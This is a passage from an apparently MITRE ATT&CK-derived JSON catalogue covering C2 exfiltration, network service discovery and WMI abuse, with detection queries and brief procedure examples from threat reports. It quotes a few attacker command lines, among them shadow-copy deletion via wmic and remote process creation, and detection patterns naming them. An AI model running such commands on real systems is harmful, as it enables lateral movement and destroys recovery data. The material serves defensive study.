      "LitePowercan send collected data, including screenshots, over its C2 channel.[97]",
      "Lokibothas the ability to initiate contact with command and control (C2) to exfiltrate stolen data.[98]",
      "LuminousMothhas used malware that exfiltrates stolen data to its C2 server.[99]",
      "Lumma Stealerhas exfiltrated collected data over existing HTTP and HTTPS C2 channels.[100][101]",
      "LunarMailcan use email image attachments with embedded data for receiving C2 commands and data exfiltration.[102]",
      "Machete's collected data is exfiltrated over the same channel used for C2.[103]",
      "MacMaexfiltrates data from a supplied path over its C2 channel.[104]",
      "Mafaldacan send network system data and files to its C2 server.[105]",
      "MagicRATexfiltrates data via HTTP over existing command and control channels.[106]",
      "Mangocan use its HTTP C2 channel for exfiltration.[107]",
      "Manjusakadata exfiltration takes place over HTTP channels.[108]",
      "MarkiRATcan exfiltrate locally stored data via its C2.[109]",
      "MechaFlounderhas the ability to send the compromised user's account name and hostname within a URL to C2.[110]",
      "metaMaincan upload collected files and data to its C2 server.[111]",
      "Metamorfocan send the data it collects to the C2 server.[112]",
      "Mis-Typehas transmitted collected files and data to its C2 server.[113]",
      "Misdathas uploaded files and data to its C2 servers.[113]",
      "Mispaducan sends the collected financial data to the C2 server.[114][115]",
      "MobileOrderexfiltrates data to its C2 server over the same protocol as C2 communications.[27]",
      "Mongallcan upload files and information from a compromised host to its C2 server.[116]",
      "MuddyWaterhas used C2 infrastructure to receive exfiltrated data.[117]",
      "NETEAGLEis capable of reading files over the C2 channel.[14]",
      "NightClubcan use SMTP and DNS for file exfiltration and C2.[118]",
      "njRAThas used HTTP to receive stolen information from the infected machine.[119]",
      "Octopushas uploaded stolen files and data from a victim's machine over its C2 channel.[120]",
      "ODAgentcan use an attacker-controlled OneDrive account to receive C2 commands and to exfiltrate files.[121]",
      "OilBoostercan use an actor-controlled OneDrive account for C2 communication and exfiltration.[121]",
      "Data exfiltration is done byOkrumusing the already opened channel with the C2 server.[122]",
      "OopsIEcan upload files from the victim's machine to its C2 server.[123]",
      "DuringOperation Dream Job,Lazarus Groupexfiltrated data from a compromised host to actor-controlled C2 servers.[124]",
      "DuringOperation Honeybee, the threat actors uploaded stolen files to their C2 servers.[125]",
      "DuringOperation Wocao, threat actors used the XServer backdoor to exfiltrate data.[126]",
      "OutSteelcan upload files from a compromised host over its C2 channel.[127]",
      "PcSharecan upload files and information from a compromised host to its C2 servers.[60]",
      "Penquincan execute the command codedo_uploadto send files to C2.[128]",
      "During the initialPikabotcommand and control check-in,Pikabotwill transmit collected system information encrypted using RC4.[129]",
      "PingPullhas the ability to exfiltrate stolen victim data through its C2 channel.[130]",
      "PoetRAThas exfiltrated data over the C2 channel.[131]",
      "PowerExchangecan exfiltrate files via its email C2 channel.[132]",
      "PowerShowerhas used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days.[133]",
      "Proxysvcperforms data exfiltration over the control server channel using a custom protocol.[134]",
      "Psyloexfiltrates data to its C2 server over the same protocol as C2 communications.[27]",
      "Pteranodonexfiltrates screenshot files to its C2 server.[62]",
      "Pupycan send screenshots files, keylogger data, files, and recorded audio back to the C2 server.[135]",
      "QakBotcan send stolen information to C2 nodes including passwords, accounts, and emails.[136]",
      "Raccoon Stealeruses existing HTTP-based command and control channels for exfiltration.[137][138][139]",
      "RDATcan exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel.[140]",
      "Remexiperforms exfiltration overBITSAdmin, which is also used for the C2 channel.[141]",
      "REvilcan exfiltrate host and malware information to C2 servers.[142]",
      "Rising Suncan send data gathered from the infected machine via HTTP POST request to the C2.[143]",
      "ROKRATcan send collected files back over same C2 channel.[144]",
      "RotaJakirosends device and other collected data back to the C2 using the established C2 channels over TCP.[145]",
      "S-Typehas uploaded data and files from a compromised host to its C2 servers.[113]",
      "Sagerunexencrypts collected system data then exfiltrates via existing command and control channels.[146]",
      "Sandworm Teamhas sent system information to its C2 server using HTTP.[147]",
      "SDBbothas sent collected data from a compromised host to its C2 servers.[58]",
      "Sharkhas the ability to upload files from the compromised host over a DNS or HTTP C2 channel.[148]",
      "SharpDiscocan load a plugin to exfiltrate stolen files to SMB shares also used in C2.[118]",
      "ShimRatReportersent generated reports to the C2 via HTTP POST requests.[149]",
      "ShrinkLockerwill exfiltrate victim system information along with the encryption key via an HTTP POST.[150][151]",
      "SideTwisthas exfiltrated data over its C2 channel.[152]",
      "SILENTTRINITYcan transfer files from an infected host to the C2 server.[153]",
      "Slivercan exfiltrate files from the victim using thedownloadcommand.[154]",
      "SLOTHFULMEDIAhas sent system information to a C2 server via HTTP and HTTPS POST requests.[155]",
      "SMOKEDHAMhas exfiltrated data to its C2 server.[156]",
      "Solarcan send staged files to C2 for exfiltration.[107]",
      "SombRAThas uploaded collected data and files from a compromised host to its C2 server.[157]",
      "Sparkhas exfiltrated data over the C2 channel.[158]",
      "Squirrelwafflehas exfiltrated victim data using HTTP POST requests to its C2 servers.[159]",
      "STARWHALEcan exfiltrate collected data to its C2 servers.[160]",
      "After data is collected byStealth Falconmalware, it is exfiltrated over the existing C2 channel.[161]",
      "StrelaStealerexfiltrates collected email credentials via HTTP POST to command and control servers.[162][163][164][165]",
      "StrifeWatercan send data and files from a compromised host to its C2 server.[166]",
      "StrongPitycan exfiltrate collected documents through C2 channels.[167][168]",
      "Stuxnetsends compromised victim information via HTTP.[169]",
      "SUGARDUMPhas sent stolen credentials and other data to its C2 server.[170]",
      "SVCReadycan send collected data in JSON format to its C2 server.[171]",
      "SysUpdatehas exfiltrated data over its C2 channel.[172]",
      "TajMahalhas the ability to send collected files over its C2.[173]",
      "ThiefQuestexfiltrates targeted file extensions in the/Users/folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string.[174][175]",
      "Tomiriscan upload files matching a hardcoded set of extensions, such as .doc, .docx, .pdf, and .rar, to its C2 server.[176]",
      "Torismacan send victim data to an actor-controlled C2 server.[177]",
      "TRANSLATEXThas exfiltrated collected credentials to the C2 server.[178]",
      "TrickBotcan send information about the compromised host and upload data to a hardcoded C2 server.[179][180]",
      "Troll Stealerexfiltrates collected information to its command and control infrastructure.[181]",
      "Ursnifhas used HTTP POSTs to exfil gathered information.[182][183][184]",
      "Valakhas the ability to exfiltrate data over the C2 channel.[185][186][187]",
      "WarzoneRATcan send collected victim data to its C2 server.[188]",
      "Winter Viverndelivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP.[189]",
      "Wizard Spiderhas exfiltrated domain credentials and network enumeration information over command and control (C2) channels.[190][191]",
      "Woody RATcan exfiltrate files from an infected machine to its C2 server.[192]",
      "XCSSETretrieves files that match the pattern defined in the INAME_QUERY variable within the user's home directory, such as*test.txt, and are below a specific size limit. It then archives the files and exfiltrates the data over its C2 channel.[193][194]",
      "Zebrocyhas exfiltrated data to the designated C2 server using HTTP POST requests.[195][196]",
      "ZIRCONIUMhas exfiltrated files via the Dropbox API C2.[197]",
      "ZLibhas sent data and files from a compromised host to its C2 servers.[113]"
    ]
  },
  "T1046": {
    "Name": "Network Service Discovery",
    "Description": "Adversaries may attempt to get a listing of services running on remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation. Common methods to acquire this information include port, vulnerability, and/or wordlist scans using tools that are brought onto a system.[1]Within cloud environments, adversaries may attempt to discover services running on other cloud hosts. Additionally, if the cloud environment is connected to a on-premises environment, adversaries may be able to identify services running on non-cloud systems as well.Within macOS environments, adversaries may use the native Bonjour application to discover services running on other macOS hosts within a network. The Bonjour mDNSResponder daemon automatically registers and advertises a host’s registered services on the network. For example, adversaries can use a mDNS query (such asdns-sd -B _ssh._tcp .) to find other systems broadcasting the ssh service.[2][3]",
    "Detects": [
      "Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Normal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment.",
      "Monitor executed commands and arguments that may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation.",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. It should be noted that when a host/ port/ service scan is performed from a compromised machine, a single machine makes multiple calls to other hosts in the network to identify live hosts and services.After compromising an initial machine, adversaries commonly attempt to laterally move across the network. The first step to attempt theLateral Movementoften involves conducting host identification, port and service scans on the internal network via the compromised machine using tools such as Nmap, Cobalt Strike, etc.Note: It should be noted that when a host/ port/ service scan is performed from a compromised machine, a single machine makes multiple calls to other hosts in the network to identify live hosts and services. This can be detected using the following queryAnalytic 1 - Identifying Port Scanning Activitysourcetype='firewall_logs' dest_ip='internal_subnet' | stats dc(dest_port) as pcount by src_ip | where pcount >5"
    ],
    "Procedure Examples": [
      "Agriusused the open-source port scannerWinEggDropto perform detailed scans of hosts of interest in victim networks.[4]",
      "APT32performed network scanning on the network to search for open ports, services, OS finger-printing, and other vulnerabilities.[5]",
      "APT39has usedCrackMapExecand a custom port scanner known as BLUETORCH for network scanning.[6][7]",
      "APT41used a malware variant called WIDETONE to conduct port scans on specified subnets.[8]",
      "Backdoor.Oldreacan use a network scanning module to identify ICS-related ports.[9]",
      "BackdoorDiplomacyhas used SMBTouch, a vulnerability scanner, to determine whether a target is vulnerable to EternalBlue malware.[10]",
      "BADHATCHcan check for open ports on a computer by establishing a TCP connection.[11]",
      "BlackBytehas used tools such as NetScan to enumerate network services in victim environments.[12]",
      "BlackByte Ransomwareidentifies remote systems via active directory queries for hostnames prior to launching remote ransomware payloads.[13]",
      "BlackEnergyhas conducted port scans on a host.[14]",
      "BlackTechhas used the SNScan tool to find other potential targets on victim networks.[15]",
      "Brute Ratel C4can conduct port scanning against targeted systems.[16]",
      "DuringC0018, the threat actors used the SoftPerfect Network Scanner for network scanning.[17]",
      "DuringC0027, used RustScan to scan for open ports on targeted ESXi appliances.[18]",
      "Caterpillar WebShellhas a module to use a port scanner on a system.[19]",
      "Chimerahas used theget -b-e-pcommand for network scanning as well as a custom Python tool  packed into a Windows executable named Get.exe to scan IP ranges for HTTP.[20]",
      "China Chopper's server component can spider authentication portals.[21]",
      "Cobalt Groupleveraged an open-source tool called SoftPerfect Network Scanner to perform network scanning.[22][23][24]",
      "Cobalt Strikecan perform port scans from an infected host.[25][26][27]",
      "Confickerscans for other machines to infect.[28]",
      "DuringCostaRicto, the threat actors employed nmap and pscan to scan target environments.[29]",
      "DarkVishnyaperformed port scanning to obtain the list of active services.[30]",
      "Ember Bearhas used tools such as NMAP for remote system discovery and enumeration in victim environments.[31]",
      "Empirecan perform port scans from an infected host.[32]",
      "FIN13has utilizednmapfor reconnaissance efforts.FIN13has also scanned for internal MS-SQL servers in a compromised network.[33][34]",
      "FIN6used publicly available tools (including Microsoft's built-in SQL querying tool, osql.exe) to map the internal network and conduct reconnaissance against Active Directory, Structured Query Language (SQL) servers, and NetBIOS.[35]",
      "Fox Kittenhas used tools including NMAP to conduct broad scanning to identify open ports.[36][37]",
      "As part of load balancingFRPcan sethealthCheck.type = \"tcp\"orhealthCheck.type = \"http\"to check service status on specific hosts with TCPing or an HTTP request.[38]",
      "HDoorscans to identify open ports on the victim.[39]",
      "HermeticWizardhas the ability to scan ports on a compromised network.[40]",
      "Hildegardhas used masscan to look for kubelets in the internal Kubernetes network.[41]",
      "DuringHomeLand Justice, threat actors executed the Advanced Port Scanner tool on compromised systems.[42][43]",
      "INC Ransomhas used NETSCAN.EXE for internal reconnaissance.[44][45]",
      "Industroyeruses a custom port scanner to map out a network.[46]",
      "InvisiMolecan scan the network for open ports and vulnerable instances of RDP and SMB protocols.[47]",
      "Koadiccan scan for open TCP ports on the target network.[48]",
      "Lazarus Grouphas used nmap from a router VM to scan ports on systems within the restricted segment of an enterprise network.[49]",
      "Leafminerscanned network services to search for vulnerabilities in the victim system.[50]",
      "To collect data on the host's Wi-Fi connection history,LightSpyreads the/Library/Preferences/SystemConfiguration/com.apple.airport.preferences.plist file.It also utilizes Apple's CWWiFiClient API to scan for nearby Wi-Fi networks and obtain data on the SSID, security type, and RSSI (signal strength) values.[51]",
      "Lotus Blossomhas used port scanners to enumerate services on remote hosts.[52]",
      "Lucifercan scan for open ports including TCP ports 135 and 1433.[53]",
      "Magic Houndhas used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning.[54]",
      "menuPasshas used tcping.exe, similar toPing, to probe port status on systems of interest.[55]",
      "MgBotincludes modules for performing HTTP and server service scans.[56]",
      "MURKYTOPhas the capability to scan for open ports on hosts in a connected network.[21]",
      "Naikonhas used the LadonGo scanner to scan target networks.[57]",
      "NBTscancan be used to scan IP networks.[58][59]",
      "OilRighas used the publicly available tool SoftPerfect Network Scanner as well as a custom tool called GOLDIRONY to conduct network scanning.[60]",
      "DuringOperation Wocao, threat actors scanned for open ports and used nbtscan to find NETBIOS nameservers.[61]",
      "P.A.S. Webshellcan scan networks for open ports and listening services.[62]",
      "Peiratescan initiate a port scan against a given IP address.[63]",
      "PoshC2can perform port scans from an infected host.[64]",
      "Pupyhas a built-in module for port scanning.[65]",
      "Pysacan perform network reconnaissance using the Advanced Port Scanner tool.[66]",
      "Ramsaycan scan for systems that are vulnerable to the EternalBlue exploit.[67][68]",
      "RedCurlhas used netstat to check if port 4119 is open.[69]",
      "Remsechas a plugin that can perform ARP scanning as well as port scanning.[70]",
      "Rockeconducted scanning for exposed TCP port 7001 as well as SSH and Redis servers.[71][72]",
      "Royalcan scan the network interfaces of targeted systems.[73]",
      "SILENTTRINITYcan scan for open ports on a compromised machine.[74]",
      "SpeakUpchecks for availability of specific ports on servers.[75]",
      "Suckflythe victim's internal network for hosts with ports 8080, 5900, and 40 open.[76]",
      "TeamTNThas used masscan to search for open Docker API ports and Kubernetes clusters.[77][41][78]TeamTNThas also used malware that utilizes zmap and zgrab to search for vulnerable services in cloud environments.[79]",
      "Threat Group-3390actors use the Hunter tool to conduct network service discovery for vulnerable systems.[80][81]",
      "Tropic Trooperusedprand an openly available tool to scan for open ports on target systems.[82][83]",
      "Volt Typhoonhas used commercial tools, LOTL utilities, and appliances already present on the system for network service discovery.[84]",
      "Xbashcan perform port scanning of TCP and UDP ports.[85]",
      "XTunnelis capable of probing the network for open ports.[86]",
      "ZxShellcan launch port scans.[8][87]"
    ]
  },
  "T1047": {
    "Name": "Windows Management Instrumentation",
    "Description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is designed for programmers and is the infrastructure for management data and operations on Windows systems.[1]WMI is an administration feature that provides a uniform environment to access Windows system components.The WMI service enables both local and remote access, though the latter is facilitated byRemote Servicessuch asDistributed Component Object ModelandWindows Remote Management.[1]Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS.[1][2]An adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information forDiscoveryas well asExecutionof commands and payloads.[2]For example,wmic.execan be abused by an adversary to delete shadow copies with the commandwmic.exe Shadowcopy Delete(i.e.,Inhibit System Recovery).[3]Note:wmic.exeis deprecated as of January of 2024, with the WMIC feature being \"disabled by default\" on Windows 11+. WMIC will be removed from subsequent Windows releases and replaced byPowerShellas the primary WMI interface.[4]In addition to PowerShell and tools likewbemtool.exe, COM APIs can also be used to programmatically interact with WMI via C++, .NET, VBScript, etc.[4]",
    "Detects": [
      "Monitor executed commands and arguments for actions that are used to perform remote behavior.Analytic 1 - Look for wmic.exeexecution with arguments indicative of remote process creation.index=windows_logs sourcetype=WinEventLog:Security OR sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational| eval CommandLine=coalesce(CommandLine, ParentCommandLine)| eval ProcessName=lower(ProcessName), CommandLine=lower(CommandLine)| search ProcessName IN (\"wmic.exe\", \"powershell.exe\", \"wbemtool.exe\", \"wmiprvse.exe\", \"wmiadap.exe\", \"scrcons.exe\")| search CommandLine IN (\"process call create\", \"shadowcopy delete\", \"process start\", \"createobject\")| stats count by _time, ComputerName, User, ProcessName, CommandLine, ParentProcessName, ParentCommandLine, dest, src_ip, dest_ip| eval alert_message=\"Suspicious WMI activity detected: \" + ProcessName + \" executed by \" + User + \" on \" + ComputerName + \" with command: \" + CommandLine| where NOT (User=\"SYSTEM\" OR ProcessName=\"wmiprvse.exe\" OR CommandLine=\"wmic shadowcopy delete\" AND src_ip=\"trusted_ip_range\")| table _time, ComputerName, User, ProcessName, CommandLine, ParentProcessName, ParentCommandLine, src_ip, dest_ip, alert_message",
      "Monitor network traffic for WMI connections for potential use to remotely edit configuration, start services, or query files. When remote WMI requests are over RPC it connects to a DCOM interface within the RPC groupnetsvcs. To detect this activity, a sensor is needed at the network level that can decode RPC traffic or on the host where the communication can be detected more natively, such as Event Tracing for Windows. Using wireshark/tshark decoders, the WMI interfaces can be extracted so that WMI activity over RPC can be detected. Although the description details how to detect remote WMI precisely, a decent estimate has been to look for the string RPCSS within the initial RPC connection on 135/tcp. It returns a superset of this activity, and will trigger on all DCOM-related services running within RPC, which is likely to also be activity that should be detected between hosts. More about RPCSS at : rpcss_dcom_interfaces.htmlLook for instances of the WMI querying in network traffic, and find the cases where a process is launched immediately after a connection is seen. This essentially merges the request to start a remote process via WMI with the process execution. If other processes are spawned from wmiprvse.exe in this time frame, it is possible for race conditions to occur, and the wrong process may be merged. If this is the case, it may be useful to look deeper into the network traffic to see if the desired command can be extracted.After the WMI connection has been initialized, a process can be remotely launched using the command:wmic /node:\"\" process call create \"\", which is detected in the third Detection Pseudocode.This leaves artifacts at both a network (RPC) and process (command line) level. Whenwmic.exe(or the schtasks API) is used to remotely create processes, Windows uses RPC (135/tcp) to communicate with the the remote machine.After RPC authenticates, the RPC endpoint mapper opens a high port connection, through which the schtasks Remote Procedure Call is actually implemented. With the right packet decoders, or by looking for certain byte streams in raw data, these functions can be identified.When the command line is executed, it has the parent process ofC:\\windows\\system32\\wbem\\WmiPrvSE.exe. This analytic looks for these two events happening in sequence, so that the network connection and target process are output.Certain strings can be identifiers of the WMI by looking up the interface UUID forIRemUnknown2in different formats- UUID00000143-0000-0000-c000-000000000046(decoded)- Hex43 01 00 00 00 00 00 00 c0 00 00 00 00 00 00 46(raw)- ASCIICF(printable text only)This identifier is present three times during the RPC request phase. Any sensor that has access to the byte code as raw, decoded, or ASCII could implement this analytic. The transfer syntax is- UUID8a885d04-1ceb-11c9-9fe8-08002b104860(decoded)- Hex04 5d 88 8a eb 1c c9 11 9f e8 08 00 2b 10 48 60(raw)- ASCII`]+H``(printable text only)Thus, a great ASCII based signature is-CF]+HCFCFhost\"Note: To detect WMI over RPC (using DCOM), a sensor needs to exist that has the insight into individual connections and can actually decode and make sense of RPC traffic. Specifically, WMI can be detected by looking at RPC traffic where the target interface matches that of WMI, which is IRemUnknown2. Look for instances of the WMI querying in network traffic, and find the cases where a process is launched immediately after a connection is seen. This essentially merges the request to start a remote process via WMI with the process execution. If other processes are spawned from wmiprvse.exe in this time frame, it is possible for race conditions to occur, and the wrong process may be merged. If this is the case, it may be useful to look deeper into the network traffic to see if the desired command can be extracted.Analytic 1 - Monitor for WMI over RPC (DCOM) connections. Look for the string RPCSS within the initial RPC connection on port 135/tcp.index=windows_logs sourcetype=WinEventLog:Security OR sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational OR sourcetype=WinEventLog:Microsoft-Windows-Security-Auditing| eval ProcessName=lower(ProcessName), CommandLine=lower(CommandLine)| search ProcessName IN (\"wmic.exe\", \"powershell.exe\", \"wmiprvse.exe\", \"wmiadap.exe\", \"scrcons.exe\", \"wbemtool.exe\")| search CommandLine IN (\"process call create\", \"win32_process\", \"win32_service\", \"shadowcopy delete\", \"network\")| search (sourcetype=\"WinEventLog:Security\" EventCode=4688) OR (sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1)| join ProcessName [ search index=windows_logs sourcetype=WinEventLog:Microsoft-Windows-Sysmon/Operational EventCode=3 | eval DestinationIp = coalesce(DestinationIp, dest_ip)| eval DestinationPort = coalesce(DestinationPort, dest_port)| search DestinationPort IN (135, 5985, 5986) ]| stats count by _time, ComputerName, User, ProcessName, CommandLine, DestinationIp, DestinationPort, dest, src_ip, dest_ip| eval alert_message=\"Suspicious WMI Network Connection Detected: \" + ProcessName + \" executed by \" + User + \" on \" + ComputerName + \" with command: \" + CommandLine + \" connecting to \" + DestinationIp + \":\" + DestinationPort| where NOT (User=\"SYSTEM\" OR ProcessName=\"wmiprvse.exe\" OR (src_ip=\"trusted_ip_range\" AND DestinationIp=\"trusted_ip_range\"))| table _time, ComputerName, User, ProcessName, CommandLine, DestinationIp, DestinationPort, src_ip, dest_ip, alert_message",
      "Monitor for newly constructed processes and/or command-lines of \"wmic\". If the command line utilitywmic.exeis used on the source host, then it can additionally be detected on an analytic. The command line on the source host is constructed into something likewmic.exe /node:\"\\<hostname>\" process call create \"\\<command line>\". It is possible to also connect via IP address, in which case the string\"\\<hostname>\"would instead look like IP Address. Processes can be created remotely via WMI in a few other ways, such as more direct API access or the built-in utility PowerShell.Note: Event IDs are for Sysmon (Event ID 10 - process access) and Windows Security Log (Event ID 4688 - a new process has been created).Besides executing arbitrary processes, wmic.exe can also be used to executed data stored in NTFS alternate data streamsNTFS File Attributes.Looks for instances of wmic.exe as well as the substrings in the command line:- process call create- /node:Analytic 1 - Detect wmic.exeprocess creation with command lines containing process call create or /node:.index=security sourcetype=\"WinEventLog:Security\" (EventCode=4688 OR EventCode=4656 OR EventCode=4103 OR EventCode=800) | eval command_line = coalesce(CommandLine, ParentCommandLine) | where (ProcessName=\"wmic.exe\" AND (command_line LIKE \"%/node:%\" OR command_line LIKE \"%process call create%\"))OR (command_line LIKE \"Invoke-WmiMethod\" OR command_line LIKE \"Get-WmiObject\" OR command_line LIKE \"gwmi\" OR command_line LIKE \"win32_process\")",
      "Monitor for newly constructed WMI objects that will execute malicious commands and payloads.Analytic 1 - WMI object creation eventsindex=security sourcetype=\"WinEventLog:Microsoft-Windows-WMI-Activity/Operational\" (EventCode=5861 OR EventCode=5857 OR EventCode=5858) | eval CommandLine = coalesce(CommandLine, ParentCommandLine) | where (EventCode=5861 AND (CommandLine LIKE \"create\" OR CommandLine LIKE \"process\")) OR (EventCode=5857 AND (CommandLine LIKE \"exec\" OR CommandLine LIKE \"invoke\")) OR (EventCode=5858 AND (CommandLine LIKE \"payload\" OR CommandLine LIKE \"wmic\"))"
    ],
    "Procedure Examples": [
      "During the2016 Ukraine Electric Power Attack, WMI in scripts were used for remote execution and system surveys.[5]",
      "Action RATcan use WMI to gather AV products installed on an infected host.[6]",
      "Agent Teslahas used wmi queries to gather information from the system.[7]",
      "Akirawill leverage COM objects accessed through WMI during execution to evade detection.[8]",
      "APT29used WMI to steal credentials and execute backdoors at a future time.[9]",
      "APT32used WMI to deploy their tools on remote machines and to gather information about the Outlook process.[10]",
      "APT41used WMI in several ways, including for execution of commands via WMIEXEC as well as for persistence viaPowerSploit.[11][12]APT41has executed files through Windows Management Instrumentation (WMI).[13]",
      "APT42has used Windows Management Instrumentation (WMI) to query anti-virus products.[14]",
      "Aquatic Pandaused WMI for lateral movement in victim environments.[15]",
      "Astarothuses WMIC to execute payloads.[16]",
      "Avaddonuses wmic.exe to delete shadow copies.[17]",
      "BADHATCHcan utilize WMI to collect system information, create new processes, and run malicious PowerShell scripts on a compromised machine.[18][19]",
      "Bazarcan execute a WMI query to gather information about the installed antivirus engine.[20][21]",
      "Black Bastahas used WMI to execute files over the network.[22]",
      "BlackByteused WMI to delete Volume Shadow Copies on victim machines.[23]",
      "BlackCatcan usewmic.exeto delete shadow copies on compromised networks.[24]",
      "ABlackEnergy2 plug-in uses WMI to gather victim host details.[25]",
      "Blue Mockingbirdhas used wmic.exe to set environment variables.[26]",
      "Brute Ratel C4can use WMI to move laterally.[27]",
      "Bumblebeecan use WMI to gather system information and to spawn processes for code injection.[28][29][30]",
      "DuringC0015, the threat actors usedwmicandrundll32to loadCobalt Strikeonto a target host.[31]",
      "DuringC0018, the threat actors used WMIC to modify administrative settings on both a local and a remote host, likely as part of the first stages for their lateral movement; they also used WMI Provider Host (wmiprvse.exe) to execute a variety of encoded PowerShell scripts using theDownloadStringmethod.[32][33]",
      "DuringC0027,Scattered Spiderused Windows Management Instrumentation (WMI) to move laterally viaImpacket.[34]",
      "CharmPowercan usewmicto gather information from a system.[35]",
      "Chimerahas used WMIC to execute remote commands.[36][37]",
      "Cinnamon Tempesthas usedImpacketfor lateral movement via WMI.[38][39]",
      "Cobalt Strikecan use WMI to deliver a payload to a remote host.[40][41][31]",
      "Covenantcan utilize WMI to install new Grunt listeners through XSL files or command one-liners.[42]",
      "CrackMapExeccan execute remote commands using Windows Management Instrumentation.[43]",
      "DarkGatehas used WMI to execute files over the network and to obtain information about the domain.[44]",
      "DarkTortillacan use WMI queries to obtain system information.[45]",
      "DarkWatchmancan use WMI to execute commands.[46]",
      "DEATHRANSOMhas the ability to use WMI to delete volume shadow copies.[47]",
      "TheDeep Pandagroup is known to utilize WMI for lateral movement.[48]",
      "TheDustySkydropper uses Windows Management Instrumentation to extract information about the operating system and whether an anti-virus is active.[49]",
      "Earth Luscaused a VBA script to execute WMI.[50]",
      "EKANScan use Windows Mangement Instrumentation (WMI) calls to execute operations.[51]",
      "Ember Bearhas used WMI execution with password hashes for command execution and lateral movement.[52]",
      "Emotethas used WMI to execute powershell.exe.[53]",
      "Empirecan use WMI to deliver a payload to a remote host.[54]",
      "EvilBunnyhas used WMI to gather information about the system.[55]",
      "EVILNUMhas used the Windows Management Instrumentation (WMI) tool to enumerate infected machines.[56]",
      "FELIXROOTuses WMI to query the Windows Registry.[57]",
      "FIN13has utilizedWMIto execute commands and move laterally on compromised Windows machines.[58][59]",
      "FIN6has used WMI to automate the remote execution of PowerShell scripts.[60]",
      "FIN7has used WMI to install malware on targeted systems.[61]",
      "FIN8's malicious spearphishing payloads use WMI to launch malware and spawncmd.exeexecution.FIN8has also used WMIC and theImpacketsuite for lateral movement, as well as during and post compromise cleanup activities.[62][63][64][65]",
      "FIVEHANDScan use WMI to delete files on a  target machine.[47][66]",
      "FlawedAmmyyleverages WMI to enumerate anti-virus on the victim.[67]",
      "DuringFrankenstein, the threat actors used WMI queries to check if various security applications were running as well as to determine the operating system version.[68]",
      "FunnyDreamcan use WMI to open a Windows command shell on a remote machine.[69]",
      "DuringFunnyDream, the threat actors usedwmiexec.vbsto run remote commands.[69]",
      "GALLIUMused WMI for execution to assist in lateral movement as well as for installing tools across multiple assets.[70]",
      "Gamaredon Grouphas used WMI to execute scripts used for discovery and for determining the C2 IP address.[71][72]",
      "GravityRATcollects various information via WMI requests, including CPU information in the Win32_Processor entry (Processor ID, Name, Manufacturer and the clock speed).[73]",
      "HALFBAKEDcan use WMI queries to gather system information.[74]",
      "HELLOKITTYcan use WMI to delete volume shadow copies.[47]",
      "HermeticWizardcan use WMI to create a new process on a remote machine viaC:\\windows\\system32\\cmd.exe /c start C:\\windows\\system32\\\\regsvr32.exe /s /iC:\\windows\\<filename>.dll.[75]",
      "DuringHomeLand Justice, threat actors used WMI to modify Windows Defender settings.[76]",
      "HOPLIGHThas used WMI to recompile the Managed Object Format (MOF) files in the WMI repository.[77]",
      "IcedIDhas used WMI to execute binaries.[78][79]",
      "IMAPLoaderuses WMI queries to query system information on victim hosts.[80]",
      "Impacket'swmiexecmodule can be used to execute commands through WMI.[81][82]",
      "INC Ransomhas used WMIC to deploy ransomware.[83][84][85]",
      "INC Ransomwarehas the ability to use wmic.exe to spread to multiple endpoints within a compromised environment.[84][86]",
      "Indrik Spiderhas used WMIC to execute commands on remote computers.[87]",
      "jRATuses WMIC to identify anti-virus products installed on the victim’s machine and to obtain firewall details.[88]",
      "Kazuarobtains a list of running processes through WMI querying.[89]",
      "Koadiccan use WMI to execute commands.[90]",
      "KOMPROGOis capable of running WMI queries.[91]",
      "Latrodectushas used WMI in malicious email infection chains to facilitate the installation of remotely-hosted files.[92][93]",
      "Lazarus Grouphas used WMIC for discovery as well as to execute payloads for persistence and lateral movement.[94][95][96][97]",
      "Leviathanhas used WMI for execution.[98]",
      "LockBit 2.0can use wmic.exe to delete volume shadow copies.[99]",
      "Lotus Blossomhas used WMI to enable lateral movement.[100]",
      "Lucifercan use WMI to log into remote machines for propagation.[101]",
      "LunarWebcan use WMI queries for discovery on the victim host.[102]",
      "Magic Houndhas used a tool to runcmd /c wmic computersystem get domainfor discovery.[103]",
      "Mazehas used WMI to attempt to delete the shadow volumes on a machine, and to connect a virtual machine to the network domain of the victim organization's network.[104][105]",
      "menuPasshas used a modified version of pentesting script wmiexec.vbs, which logs into a remote machine using WMI.[106][107][108]",
      "Meteorcan usewmic.exeas part of its effort to delete shadow copies.[109]",
      "Micropsiasearches for anti-virus software and firewall products installed on the victim’s machine using WMI.[110][111]",
      "MoleNetcan perform WMI commands on the system.[112]",
      "Mosquito's installer uses WMI to search for antivirus display names.[113]",
      "MuddyWaterhas used malware that leveraged WMI for execution and querying host information.[114][115][116][117]",
      "Mustang Pandahas executed PowerShell scripts via WMI.[118][119]",
      "Naikonhas used WMIC.exe for lateral movement.[120]",
      "Netwalkercan use WMI to delete Shadow Volumes.[121]",
      "NotPetyacan usewmicto help propagate itself across a network.[122][123]",
      "Octopushas used wmic.exe for local discovery information.[124]",
      "OilRighas used WMI for execution.[125][126]",
      "Olympic Destroyeruses WMI to help propagate itself across a network.[127]",
      "OopsIEuses WMI to perform discovery techniques.[128]",
      "DuringOperation Dream Job,Lazarus Groupused WMIC to executed a remote XSL script.[129]",
      "DuringOperation Wocao, threat actors has used WMI to execute commands.[130]",
